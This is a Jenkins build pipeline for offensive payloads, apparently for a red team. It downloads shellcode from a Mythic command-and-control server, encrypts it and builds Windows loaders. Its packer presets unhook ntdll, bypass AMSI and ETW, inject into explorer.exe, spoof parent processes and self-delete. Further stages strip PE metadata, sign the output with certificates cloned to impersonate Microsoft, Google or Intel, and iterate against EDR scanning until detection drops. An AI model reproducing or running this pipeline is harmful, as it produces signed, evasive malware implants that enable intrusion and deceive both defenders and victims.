pipeline {
    agent none

    parameters {
        string(name: 'LANGUAGE', defaultValue: '', description: 'Loader directory name under loaders/ (e.g. loader-c-mingw). Auto-detected from job name if empty.')
        choice(name: 'OUTPUT_FORMAT', choices: ['exe', 'dll', 'shellcode'], description: 'Output format')
        string(name: 'OBFUSCATION', defaultValue: 'none', description: 'Obfuscation profile (none, ollvm-cff, ollvm-bcf-cff, ollvm-full, ollvm-heavy, garble-literals, string-encrypt, calypso)')
        string(name: 'SHELLCODE_PATH', defaultValue: '', description: 'Path to shellcode binary (relative to repo)')
        string(name: 'MYTHIC_PAYLOAD_UUID', defaultValue: '', description: 'Mythic payload UUID to fetch shellcode from')
        string(name: 'SHELLCODE_SOURCE', defaultValue: '', description: 'Daedalus shellcode source ref (mythic:<uuid>)')
        choice(name: 'CALYPSO_MODE', choices: ['pack', 'standalone'], description: 'Calypso mode: pack wraps the compiled loader in Calypso (loader-in-loader), standalone feeds raw shellcode to Calypso and uses its own loader (single loader)')
        string(name: 'PACKER_PRESET', defaultValue: '', description: 'Calypso packer preset from build-profiles.yml (e.g. stealth, evasive, evasive-drip, minimal). Resolved to flags at build time. Ignored if PACKER_FLAGS is set.')
        string(name: 'PACKER_FLAGS', defaultValue: '', description: 'Raw Calypso packer flags (e.g. --unhook ntdll.dll --amsi hwbp --etw hwbp). Overrides PACKER_PRESET if both are set.')
        booleanParam(name: 'LITTERBOX_SCAN', defaultValue: true, description: 'Submit to LitterBox after build')
        choice(name: 'SCAN_TYPE', choices: ['all', 'static', 'dynamic', 'edr'], description: 'LitterBox scan profile')
        booleanParam(name: 'PE_SANITISE', defaultValue: true, description: 'Strip PE metadata post-build')
        string(name: 'SIGNING_PROFILE', defaultValue: 'none', description: 'Code signing profile: microsoft, google, intel, custom, none')
        choice(name: 'TARGET_ARCH', choices: ['amd64', 'arm64'], description: 'Target architecture')
        string(name: 'OPERATOR_ID', defaultValue: '', description: 'Operator callsign for deconfliction tagging')
        string(name: 'CAMPAIGN_TAG', defaultValue: '', description: 'Campaign identifier for deconfliction tagging')
    }

    environment {
        LITTERBOX_URL    = credentials('litterbox-url')
        MYTHIC_URL       = credentials('mythic-url')
        MYTHIC_API_TOKEN = credentials('mythic-api-token')
        ARTIFACT_DIR     = "/payloads/${env.BUILD_TAG}"
    }

    stages {
        stage('Checkout') {
            agent { label 'linux-generic' }
            steps {
                checkout scm
                stash includes: '**', name: 'source'
                script {
                    def isCalypsoStandalone = (params.OBFUSCATION == 'calypso' && params.CALYPSO_MODE == 'standalone')

                    // Resolve loader name: job name (loader-<name>) or LANGUAGE param
                    def jobLang = env.JOB_NAME.replaceFirst(/^loader-/, '')
                    def paramLang = params.LANGUAGE?.trim() ?: ''
                    def loaderDir = ''

                    if (paramLang) {
                        // Accept both "c-mingw" and "loader-c-mingw"
                        loaderDir = paramLang.startsWith('loader-') ? paramLang : "loader-${paramLang}"
                    } else if (jobLang != env.JOB_NAME) {
                        loaderDir = "loader-${jobLang}"
                    } else if (!isCalypsoStandalone) {
                        error "Cannot determine loader. Set LANGUAGE parameter or name the job loader-<name>."
                    }

                    if (isCalypsoStandalone) {
                        // Calypso standalone doesn't need a custom loader
                        env.LOADER_DIR = loaderDir ?: 'none'
                        env.EFFECTIVE_LANG = 'calypso'
                        echo "Calypso standalone mode (no custom loader)"
                    } else {
                        // Validate the loader directory exists and has build.sh + loader.yml
                        def exists = sh(script: "[ -d loaders/${loaderDir} ] && echo yes || echo no", returnStdout: true).trim()
                        if (exists != 'yes') {
                            error "Loader directory loaders/${loaderDir} not found. Available: " +
                                  sh(script: "ls -1 loaders/", returnStdout: true).trim()
                        }
                        def hasBuild = sh(script: "[ -f loaders/${loaderDir}/build.sh ] && echo yes || echo no", returnStdout: true).trim()
                        if (hasBuild != 'yes') {
                            error "loaders/${loaderDir}/build.sh not found. Each loader must provide a build.sh."
                        }
                        def hasManifest = sh(script: "[ -f loaders/${loaderDir}/loader.yml ] && echo yes || echo no", returnStdout: true).trim()
                        if (hasManifest != 'yes') {
                            error "loaders/${loaderDir}/loader.yml not found. Each loader must provide a loader.yml."
                        }

                        env.LOADER_DIR = loaderDir
                        // Strip "loader-" prefix for backwards compat (Daedalus, archive paths)
                        env.EFFECTIVE_LANG = loaderDir.replaceFirst(/^loader-/, '')
                        echo "Loader: ${loaderDir} (lang: ${env.EFFECTIVE_LANG})"
                    }
                }
            }
        }

        stage('Fetch Mythic Payload') {
            when {
                beforeAgent true
                expression {
                    def src = params.SHELLCODE_SOURCE?.trim() ?: ''
                    def uuid = params.MYTHIC_PAYLOAD_UUID?.trim() ?: ''
                    return src.startsWith('mythic:') || uuid
                }
            }
            agent { label 'linux-generic' }
            steps {
                script {
                    def shellcodeSource = params.SHELLCODE_SOURCE?.trim() ?: ''
                    def directUuid = params.MYTHIC_PAYLOAD_UUID?.trim() ?: ''
                    if (shellcodeSource.startsWith('mythic:')) {
                        env.RESOLVED_PAYLOAD_UUID = shellcodeSource.replaceFirst(/^mythic:/, '')
                    } else {
                        env.RESOLVED_PAYLOAD_UUID = directUuid
                    }
                }
                sh """#!/bin/bash
                    set -euo pipefail
                    mkdir -p shellcode

                    echo "[*] Fetching payload ${env.RESOLVED_PAYLOAD_UUID} from Mythic..."
                    HTTP_CODE=\$(curl -sk -w '%{http_code}' \\
                        "\${MYTHIC_URL}/direct/download/${env.RESOLVED_PAYLOAD_UUID}" \\
                        -o shellcode/payload.bin)

                    if [ "\$HTTP_CODE" -ne 200 ] || [ ! -s shellcode/payload.bin ]; then
                        echo "[!] Direct download failed (HTTP \$HTTP_CODE), trying API endpoint..."
                        HTTP_CODE=\$(curl -sk -w '%{http_code}' \\
                            -H "apitoken: \${MYTHIC_API_TOKEN}" \\
                            "\${MYTHIC_URL}/api/v1.4/payloads/download/${env.RESOLVED_PAYLOAD_UUID}" \\
                            -o shellcode/payload.bin)
                        if [ "\$HTTP_CODE" -ne 200 ] || [ ! -s shellcode/payload.bin ]; then
                            echo "[-] ERROR: Both download methods failed (HTTP \$HTTP_CODE)"
                            exit 1
                        fi
                        echo "[+] Downloaded via API endpoint"
                    else
                        echo "[+] Downloaded via direct link"
                    fi

                    SC_SIZE=\$(stat -c%s shellcode/payload.bin)
                    echo "[+] Payload size: \$SC_SIZE bytes"
                    if [ "\$SC_SIZE" -lt 16 ]; then
                        echo "[!] WARNING: Payload is only \$SC_SIZE bytes - verify the UUID is correct"
                    fi
                """
                stash includes: 'shellcode/**', name: 'shellcode'
            }
        }

        stage('Encrypt Shellcode') {
            when {
                beforeAgent true
                expression {
                    // Skip shellcrypt when Calypso standalone handles the shellcode directly
                    !(params.OBFUSCATION == 'calypso' && params.CALYPSO_MODE == 'standalone')
                }
            }
            agent {
                docker {
                    image 'maas-builder-c'
                    label 'linux-c'
                }
            }
            steps {
                unstash 'source'
                script {
                    def hasShellcode = params.SHELLCODE_SOURCE?.trim() || params.MYTHIC_PAYLOAD_UUID?.trim()
                    if (hasShellcode) { unstash 'shellcode' }
                }
                script {
                    def scInput = params.SHELLCODE_PATH?.trim() ?: 'shellcode/payload.bin'
                    sh """#!/bin/bash
                        set -euo pipefail
                        mkdir -p shellcode

                        SC_INPUT="${scInput}"
                        if [ ! -f "\$SC_INPUT" ]; then
                            echo "[-] ERROR: Shellcode file '\$SC_INPUT' not found."
                            echo "    Provide shellcode via MYTHIC_PAYLOAD_UUID / SHELLCODE_SOURCE or place it at SHELLCODE_PATH."
                            exit 1
                        fi

                        SC_SIZE=\$(stat -c%s "\$SC_INPUT")
                        echo "[+] Using shellcode: \$SC_INPUT (\$SC_SIZE bytes)"

                        XOR_KEY=\$(python3 -c "import os; print(os.urandom(32).hex())")

                        python3 \${SHELLCRYPT} -i "\$SC_INPUT" -e xor -k "\$XOR_KEY" -f c -a shellcode -o shellcode/shellcode.h
                        python3 \${SHELLCRYPT} -i "\$SC_INPUT" -e xor -k "\$XOR_KEY" -f go -a shellcode -o shellcode/shellcode.go
                        sed -i '1i\\\\package main' shellcode/shellcode.go
                        python3 \${SHELLCRYPT} -i "\$SC_INPUT" -e xor -k "\$XOR_KEY" -f rust -a shellcode -o shellcode/shellcode.rs
                        sed -i 's/^let /pub static /' shellcode/shellcode.rs
                        expand -t4 shellcode/shellcode.rs > shellcode/shellcode.rs.tmp && mv shellcode/shellcode.rs.tmp shellcode/shellcode.rs
                        python3 \${SHELLCRYPT} -i "\$SC_INPUT" -e xor -k "\$XOR_KEY" -f csharp -a shellcode -o shellcode/Shellcode.cs
                        sed -i '1i\\\\static class SC {' shellcode/Shellcode.cs
                        echo "}" >> shellcode/Shellcode.cs
                        sed -i 's/^byte\\[\\]/    internal static byte[]/' shellcode/Shellcode.cs

                        echo "[+] Shellcode encrypted with Shellcrypt (key: 32 bytes)"
                    """
                }
                stash includes: 'shellcode/**', name: 'encrypted-shellcode'
            }
        }

        stage('Build') {
            when {
                beforeAgent true
                expression {
                    // Skip custom loader build when Calypso standalone uses its own loader
                    !(params.OBFUSCATION == 'calypso' && params.CALYPSO_MODE == 'standalone')
                }
            }
            agent {
                docker {
                    image "${-> readYaml(file: "loaders/${env.LOADER_DIR}/loader.yml").docker_image}"
                    label "${-> readYaml(file: "loaders/${env.LOADER_DIR}/loader.yml").agent_label}"
                    args "${-> readYaml(file: "loaders/${env.LOADER_DIR}/loader.yml").volumes?.collect { '-v ' + it }?.join(' ') ?: ''}"
                }
            }
            steps {
                unstash 'source'
                unstash 'encrypted-shellcode'
                script {
                    def manifest = readYaml file: "loaders/${env.LOADER_DIR}/loader.yml"
                    def scDest = manifest.shellcode_dest
                    def scFormat = manifest.shellcode_format

                    // Copy the right shellcode format into the loader source tree
                    def scSrcMap = [
                        'c':      'shellcode/shellcode.h',
                        'go':     'shellcode/shellcode.go',
                        'rust':   'shellcode/shellcode.rs',
                        'csharp': 'shellcode/Shellcode.cs',
                    ]
                    def scSrc = scSrcMap[scFormat]
                    if (!scSrc) {
                        error "Unknown shellcode_format '${scFormat}' in loader.yml"
                    }
                    sh "cp '${scSrc}' 'loaders/${env.LOADER_DIR}/${scDest}'"

                    // Run the loader's build script
                    def outputFormat = params.OUTPUT_FORMAT ?: 'exe'
                    def targetArch = params.TARGET_ARCH ?: 'amd64'
                    def obfuscation = params.OBFUSCATION ?: 'none'

                    dir("loaders/${env.LOADER_DIR}") {
                        sh """#!/bin/bash
                            set -euo pipefail
                            chmod +x build.sh
                            ./build.sh '${outputFormat}' '${targetArch}' '${obfuscation}'
                        """
                    }

                    // Move artifact to workspace root for downstream stages
                    sh "cp loaders/${env.LOADER_DIR}/loader.* ."
                }
                stash includes: "loader.*", name: 'artifact'
            }
        }

        stage('Pack - Calypso') {
            when {
                beforeAgent true
                expression { params.OBFUSCATION == 'calypso' }
            }
            agent {
                docker {
                    image 'maas-builder-calypso'
                    label 'linux-generic'
                    args '-v /payloads:/payloads'
                }
            }
            steps {
                unstash 'source'
                script {
                    def calypsoMode = params.CALYPSO_MODE ?: 'pack'
                    def calypsoFlags = params.PACKER_FLAGS?.trim() ?: ''

                    if (!calypsoFlags && params.PACKER_PRESET?.trim()) {
                        def presets = [
                            'none'              : '',
                            'fast'              : '--unhook ntdll.dll --inject local --execute thread --syscall indirect --cipher aes-cbc',
                            'stealth'           : '--unhook ntdll.dll --inject local --execute thread --syscall indirect --cipher aes-cbc --sleep 10 --amsi hwbp --etw hwbp',
                            'stealth-obfuscated': '--unhook ntdll.dll --inject local --execute thread --syscall indirect --cipher aes-cbc --sleep 10 --amsi hwbp --etw hwbp --obfuscate --entropy-reduce',
                            'evasive'           : '--unhook ntdll.dll --inject remote --execute riscvm --process explorer.exe --ppid explorer.exe --syscall indirect --cipher aes-cbc --compress zlib --sleep 60 --amsi hwbp,context-corrupt --etw hwbp,complus --sandbox memory --block-dlls --obfuscate --entropy-reduce --self-delete --hide',
                            'evasive-drip'      : '--unhook ntdll.dll --execute riscvm --ppid explorer.exe --syscall indirect --cipher rc4 --compress rle --encode uuid --sleep 60 --amsi context-corrupt --etw complus --sandbox memory,diskspace --module-stomp --drip --obfuscate --entropy-reduce --self-delete --hide',
                            'minimal'           : '--no-antidebug --amsi none --etw none --cipher xor --inject local --execute direct',
                        ]
                        def presetName = params.PACKER_PRESET.trim()
                        if (presets.containsKey(presetName)) {
                            calypsoFlags = presets[presetName]
                            echo "[*] Resolved packer preset '${presetName}' → ${calypsoFlags ?: '(no flags)'}"
                        } else {
                            error "Unknown packer preset '${presetName}'. Available: ${presets.keySet().join(', ')}"
                        }
                    }

                    if (calypsoMode == 'standalone') {
                        // Standalone: Calypso takes raw shellcode, uses its own loader
                        def hasShellcode = params.SHELLCODE_SOURCE?.trim() || params.MYTHIC_PAYLOAD_UUID?.trim()
                        if (hasShellcode) { unstash 'shellcode' }

                        def scInput = params.SHELLCODE_PATH?.trim() ?: 'shellcode/payload.bin'

                        sh """#!/bin/bash
                            set -euo pipefail
                            if [ ! -f '${scInput}' ]; then
                                echo '[-] ERROR: Shellcode file ${scInput} not found for Calypso standalone mode.'
                                exit 1
                            fi
                            SC_SIZE=\$(stat -c%s '${scInput}')
                            echo "[*] Calypso standalone: processing raw shellcode (\$SC_SIZE bytes)"
                            ABS_IN="\$(pwd)/${scInput}"
                            ABS_OUT="\$(pwd)/loader.exe"
                            /opt/calypso/build/calypso --file "\$ABS_IN" --type shellcode \
                                --output "\$ABS_OUT" --hide \
                                ${calypsoFlags}
                            echo "[+] Calypso standalone output: loader.exe (\$(stat -c%s loader.exe) bytes)"
                        """
                    } else {
                        // Pack mode: wrap the compiled custom loader PE
                        unstash 'artifact'
                        def packMode = (env.EFFECTIVE_LANG == 'csharp') ? '--type csharp' : '--peinject'

                        sh """#!/bin/bash
                            set -euo pipefail
                            for f in loader.*; do
                                [ -f "\$f" ] || continue
                                EXT="\${f##*.}"
                                ABS_IN="\$(pwd)/\$f"
                                ABS_OUT="\$(pwd)/\${f%.\$EXT}-packed.\$EXT"
                                echo "[*] Packing \$f with Calypso (${packMode}, lang: ${env.EFFECTIVE_LANG})"
                                /opt/calypso/build/calypso --file "\$ABS_IN" ${packMode} \
                                    --output "\$ABS_OUT" \
                                    ${calypsoFlags}
                                mv "\$ABS_OUT" "\$f"
                            done
                        """
                    }
                }
                stash includes: "loader.*", name: 'artifact'
            }
        }

        stage('PE Sanitisation') {
            when {
                beforeAgent true
                expression { params.PE_SANITISE }
            }
            agent { label 'linux-generic' }
            steps {
                unstash 'source'
                unstash 'artifact'
                sh """
                    python3 pipeline/tools/pe-sanitise.py loader.* \\
                        --strip-rich --randomise-timestamp \\
                        --strip-debug --strip-version-info
                """
                stash includes: "loader.*", name: 'sanitised'
            }
        }

        stage('Sign - Limelighter') {
            when {
                beforeAgent true
                expression { params.SIGNING_PROFILE != 'none' && params.SIGNING_PROFILE?.trim() }
            }
            agent {
                docker {
                    image 'maas-builder-go'
                    label 'linux-go'
                    args '-v /payloads:/payloads'
                }
            }
            steps {
                script {
                    try { unstash 'sanitised' } catch (e) { unstash 'artifact' }
                }
                unstash 'source'
                script {
                    def profiles = readYaml file: 'pipeline/tools/signing-profiles.yml'
                    def profileName = params.SIGNING_PROFILE
                    def profile = profiles.profiles[profileName]
                    if (!profile || !profile.domain) {
                        error "Unknown or invalid signing profile: ${profileName}"
                    }
                    def domain = profile.domain
                    def mode = profile.mode ?: 'clone'

                    if (mode == 'pfx') {
                        def pfxPath = profile.pfx_path ?: error("PFX profile '${profileName}' missing pfx_path")
                        def password = profile.password ?: ''
                        sh """
                            for f in loader.*; do
                                [ -f "\$f" ] || continue
                                echo "[*] Signing \$f with real certificate (profile: ${profileName})"
                                Limelighter -I "\$f" -O "\${f}.signed" -Real "${pfxPath}" -Password "${password}"
                                mv "\${f}.signed" "\$f"
                            done
                        """
                    } else if (mode == 'self-signed') {
                        def password = profile.password ?: 'changeme'
                        sh """
                            for f in loader.*; do
                                [ -f "\$f" ] || continue
                                echo "[*] Signing \$f with self-signed cert (profile: ${profileName}, domain: ${domain})"
                                Limelighter -I "\$f" -O "\${f}.signed" -Domain "${domain}" -Password "${password}"
                                mv "\${f}.signed" "\$f"
                            done
                        """
                    } else {
                        sh """
                            for f in loader.*; do
                                [ -f "\$f" ] || continue
                                echo "[*] Signing \$f with cloned cert (profile: ${profileName}, domain: ${domain})"
                                Limelighter -I "\$f" -O "\${f}.signed" -Domain "${domain}"
                                mv "\${f}.signed" "\$f"
                            done
                        """
                    }
                }
                stash includes: "loader.*", name: 'signed'
            }
        }

        stage('Checksum') {
            agent { label 'linux-generic' }
            steps {
                script {
                    try { unstash 'signed' } catch (e) {
                        try { unstash 'sanitised' } catch (e2) { unstash 'artifact' }
                    }
                }
                sh 'sha256sum loader.* > checksums.sha256'
                stash includes: 'loader.*,checksums.sha256', name: 'final'
            }
        }

        stage('Deconfliction Tag') {
            when {
                beforeAgent true
                expression { params.OPERATOR_ID?.trim() && params.CAMPAIGN_TAG?.trim() }
            }
            agent { label 'linux-generic' }
            steps {
                unstash 'final'
                unstash 'source'
                sh """#!/bin/bash
                    set -euo pipefail
                    for f in loader.*; do
                        [ -f "\$f" ] || continue
                        echo "[*] Tagging \$f (operator: ${params.OPERATOR_ID}, campaign: ${params.CAMPAIGN_TAG})"
                        python3 pipeline/tools/deconflict-tag.py tag \\
                            --input "\$f" \\
                            --operator "${params.OPERATOR_ID}" \\
                            --campaign "${params.CAMPAIGN_TAG}"
                    done
                """
                sh 'sha256sum loader.* > checksums.sha256'
                stash includes: 'loader.*,checksums.sha256', name: 'final'
            }
        }

        stage('Version Manifest') {
            agent { label 'linux-generic' }
            steps {
                unstash 'final'
                unstash 'source'
                script {
                    def scFile = params.SHELLCODE_PATH ?: 'shellcode/payload.bin'
                    sh """#!/bin/bash
                        set -euo pipefail
                        python3 pipeline/tools/payload-version.py \
                            --source-dir . \
                            --shellcode "${scFile}" \
                            --obfuscation "${params.OBFUSCATION}" \
                            --flags "" \
                            --profile "${env.EFFECTIVE_LANG}" \
                            --pe-file \$(ls loader.* | head -1) \
                            --output manifest.json
                    """
                }
                stash includes: 'manifest.json', name: 'manifest'
                archiveArtifacts artifacts: 'manifest.json'
            }
        }

        stage('LitterBox Scan') {
            when {
                beforeAgent true
                expression { params.LITTERBOX_SCAN }
            }
            agent { label 'linux-generic' }
            steps {
                unstash 'final'
                sh """#!/bin/bash
                    set -euo pipefail
                    LB="\${LITTERBOX_URL}"
                    FILE=\$(ls loader.* | head -1)
                    SCAN_TYPE="${params.SCAN_TYPE}"
                    TIMEOUT=300

                    echo "[*] Uploading \${FILE} to LitterBox..."
                    UPLOAD=\$(curl -sf -X POST "\${LB}/upload" \\
                        -F "file=@\${FILE};type=application/octet-stream")
                    MD5=\$(echo "\$UPLOAD" | jq -r '.file_info.md5')
                    if [ -z "\$MD5" ] || [ "\$MD5" = "null" ]; then
                        echo "[-] Upload failed"; exit 1
                    fi
                    echo "[+] Uploaded - MD5: \${MD5}"

                    trigger_scan() {
                        local type="\$1"
                        echo "[*] Triggering \${type} scan..."
                        curl -sf -X POST "\${LB}/analyze/\${type}/\${MD5}" | jq . || true
                    }

                    poll_scan() {
                        local url="\$1" elapsed=0 interval=2
                        while [ \$elapsed -lt \$TIMEOUT ]; do
                            RESULT=\$(curl -sf "\$url" 2>/dev/null || echo '{}')
                            STATUS=\$(echo "\$RESULT" | jq -r '.status // empty')
                            case "\$STATUS" in
                                completed|blocked_by_av|partial|error|agent_unreachable|early_termination|"")
                                    return 0 ;;
                            esac
                            sleep \$interval
                            elapsed=\$((elapsed + interval))
                            interval=\$(( interval * 3 / 2 ))
                            [ \$interval -gt 15 ] && interval=15
                        done
                        echo "[!] Poll timed out after \${TIMEOUT}s"
                    }

                    case "\$SCAN_TYPE" in
                        static)
                            trigger_scan static
                            sleep 3
                            ;;
                        dynamic)
                            trigger_scan dynamic
                            poll_scan "\${LB}/api/results/dynamic/\${MD5}"
                            ;;
                        edr)
                            PROFILES=\$(curl -sf "\${LB}/api/edr/profiles" | jq -r '.profiles[].name' 2>/dev/null || true)
                            for p in \$PROFILES; do
                                trigger_scan "edr/\${p}"
                                echo "[*] Waiting 60s for EDR agent to execute and collect alerts..."
                                sleep 60
                                poll_scan "\${LB}/api/results/edr/\${p}/\${MD5}"
                            done
                            ;;
                        all)
                            trigger_scan static
                            trigger_scan dynamic
                            sleep 3
                            poll_scan "\${LB}/api/results/dynamic/\${MD5}"
                            PROFILES=\$(curl -sf "\${LB}/api/edr/profiles" | jq -r '.profiles[].name' 2>/dev/null || true)
                            for p in \$PROFILES; do
                                trigger_scan "edr/\${p}"
                                echo "[*] Waiting 60s for EDR agent to execute and collect alerts..."
                                sleep 60
                                poll_scan "\${LB}/api/results/edr/\${p}/\${MD5}"
                            done
                            ;;
                    esac

                    echo "[*] Fetching risk assessment..."
                    curl -sf "\${LB}/api/results/risk/\${MD5}" | jq . > results.json
                    echo "[+] Results: \${LB}/results/info/\${MD5}"
                """
                script {
                    def results = readJSON file: 'results.json'
                    def risk = results.risk_level ?: 'unknown'
                    echo "LitterBox Verdict: ${risk}"
                    echo "Results URL: ${env.LITTERBOX_URL}/results/info/${results.md5 ?: ''}"
                    if (risk == 'critical' || risk == 'high') {
                        unstable("Payload flagged: ${risk} risk")
                    }
                }
                archiveArtifacts artifacts: 'results.json'
            }
        }

        stage('Archive') {
            agent { label 'linux-generic' }
            steps {
                unstash 'final'
                script {
                    try { unstash 'manifest' } catch (e) {
                        echo "No manifest to archive"
                    }
                }
                sh """
                    mkdir -p "\${ARTIFACT_DIR}"
                    cp loader.* checksums.sha256 "\${ARTIFACT_DIR}/"
                    [ -f manifest.json ] && cp manifest.json "\${ARTIFACT_DIR}/"
                """
                archiveArtifacts artifacts: 'loader.*,checksums.sha256,manifest.json', allowEmptyArchive: true
            }
        }
    }

    post {
        always {
            node('linux-generic') {
                deleteDir()
            }
        }
        success {
            node('linux-generic') {
                unstash 'final'
                script {
                    try { unstash 'manifest' } catch (e) { /* no manifest */ }
                }
                sh """#!/bin/bash
                    set -euo pipefail
                    if [ -f manifest.json ]; then
                        VERSION=\$(python3 -c "import sys,json; print(json.load(sys.stdin)['version'])" < manifest.json)
                    else
                        VERSION="\$(date +%s)"
                    fi
                    LOADER="${env.EFFECTIVE_LANG}"
                    ARCHIVE="/payloads/archive/\${LOADER}/\${VERSION}"
                    mkdir -p "\$ARCHIVE"
                    cp loader.* "\$ARCHIVE/" 2>/dev/null || true
                    [ -f checksums.sha256 ] && cp checksums.sha256 "\$ARCHIVE/"
                    [ -f manifest.json ] && cp manifest.json "\$ARCHIVE/"
                    echo "[+] Archived \${LOADER} version \${VERSION}"

                    cd "/payloads/archive/\${LOADER}/"
                    ls -1t | tail -n +11 | xargs -r rm -rf
                    REMAINING=\$(ls -1 | wc -l)
                    echo "[+] Archive contains \${REMAINING} version(s)"
                """
            }
        }
    }
}
